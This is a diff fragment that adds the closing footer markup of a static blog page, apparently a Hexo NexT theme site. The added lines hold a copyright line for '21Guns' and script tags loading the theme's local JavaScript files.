+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2016 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">21Guns</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script size="300" alpha="0.5" zindex="0" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
+<script src="/js/schemes/pisces.js"></script>
+<script src="/js/next-boot.js"></script>
+
+
+
+  
+
+
+
+
+  <script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
